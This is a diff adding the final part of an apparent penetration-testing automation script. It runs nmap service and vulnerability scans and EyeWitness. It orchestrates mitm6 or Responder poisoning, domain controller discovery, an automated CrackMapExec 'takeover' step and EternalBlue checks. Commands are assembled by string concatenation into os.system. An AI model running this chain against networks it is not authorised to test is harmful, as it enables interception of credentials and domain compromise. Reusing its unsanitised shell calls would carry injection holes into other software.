+        #---------------
+        #Execute Command
+        #---------------
+        print("Command: gnome-terminal -- eyewitness --web -f " + path + "http-ips.txt --prepend-https -d eyewitness --results 50 --no-prompt --only-ports '" + ports + "'")
+        os.system("gnome-terminal -- eyewitness --web -f " + path + "http-ips.txt --prepend-https -d eyewitness --results 50 --no-prompt --only-ports '" + ports + "'")
+        sleep(3)
+        os.system("mv " + path + "http-ips.txt eyewitness/. && mv " + path + "http-ports.txt eyewitness/.")  # Cleaning
+        os.system("mv geckodriver.log eyewitness/. 2>/dev/null") # More cleaning
+        print()
+        print("Directory created: eyewitness/")
+        sleep(1)
+        print("File created: http-ports.txt")
+        sleep(1)
+        print("File created: http-ips.txt")
+        sleep(1)
+        print()
+#-------------------------------------------------------------------------------
+# serviceDetection()
+#-------------------------------------------------------------------------------
+def serviceDetection():
+    print()
+    print(" -----------------------------------")
+    print("| PERFORMING SERVICE DETECTION SCAN |")
+    print(" -----------------------------------")
+    write_file=path + "nmap-services.txt"
+    if file_check(write_file) == False:
+        print("Command: nmap -sV -T4 -Pn -n --open --min-parallelism 100 --max-parallelism 256 -iL " + path + "alive.txt -oN " + path + "nmap-services.txt")
+        print()
+        os.system("nmap -sV -T4 -Pn -n --open --max-rtt-timeout 100ms --initial-rtt-timeout 45ms --min-parallelism 100 --max-parallelism 256 -iL " + path + "alive.txt -oN " + path + "nmap-services.txt")
+        print()
+        print("File created: nmap-services.txt")
+        sleep(1)
+    else:
+        pass
+
+#-------------------------------------------------------------------------------
+# vulnscan()
+#-------------------------------------------------------------------------------
+def vulnscan():
+    print()
+    print(" ------------------------------------")
+    print("| PERFORMING NMAP VULNERABILITY SCAN |")
+    print(" ------------------------------------")
+    write_file=path + "nmap-vulns.txt"
+    if file_check(write_file) == False:
+        print("Command: nmap -sV -T4 -Pn -n --open --max-rtt-timeout 100ms --initial-rtt-timeout 45ms --min-parallelism 100 --max-parallelism 256 --script=vuln -iL " + path + "alive.txt -oN " + path + "nmap-vulns.txt")
+        print()
+        print("THIS MIGHT TAKE AWHILE...")
+        os.system("nmap -sV -T4 -Pn -n --open --max-rtt-timeout 100ms --initial-rtt-timeout 45ms --min-parallelism 100 --max-parallelism 256 --script=vuln -iL " + path + "alive.txt -oN " + path + "nmap-vulns.txt")
+        print()
+        print("File created: nmap-vulns.txt")
+        sleep(1)
+        print()
+    else:
+        pass
+
+#-----------------------------------------------------------
+# main()
+#-----------------------------------------------------------
+def main():
+# ALL OF THIS COULD BE SERIOUSLY CLEANED UP
+    linux=False # will be shorthand for platform.startswith("linux") in if statements.
+    if platform.startswith("linux"): #not really all that necessary
+        linux=True
+
+    if linux==True and results.all:
+        pingSweep()
+        portScan()
+        parse()
+        runFinger()
+        gen_relay_list()
+        if results.mitm and results.responder: # if '--all' and both mitm flags, default to mitm6
+            mitm6()
+        elif results.responder:
+            responder()
+        elif results.mitm:
+            fqdn=mitm6()
+            DC=findDC(fqdn)
+            autoCME(DC,fqdn) # Sending fqdn to use in initDB
+        checkEternal()
+        serviceDetection()
+        eyeWitness()
+        if results.vulnscan:
+            vulnscan()
+        exit()
+
+    if linux==False and results.all:
+        pingSweep()
+        portScan()
+        serviceDetection()
+        vulnscan()
+        exit()
+
+    if results.pingsweep:
+        pingSweep()
+    if results.quickscan:
+        portScan()
+        parse()
+
+    if linux==True:
+        if results.runfinger:
+            runFinger()
+        if results.mitm and results.responder:
+            gen_relay_list()
+            fqdn=mitm6()
+            DC=findDC(fqdn)
+        elif results.mitm:
+            gen_relay_list()
+            fqdn=mitm6()
+            DC=findDC(fqdn)
+        elif results.responder:
+            gen_relay_list()
+            responder()
+        if results.takeover:
+            if not results.mitm:
+                fqdn=mitm6()
+                DC=findDC()
+            autoCME(DC,fqdn)
+        if results.eternalcheck:
+            checkEternal()
+        if results.service_detection:
+            serviceDetection()
+        if results.eyewitness:
+            eyeWitness()
+        if results.vulnscan:
+            vulnscan()
+        exit()
+
+main()
+exit()
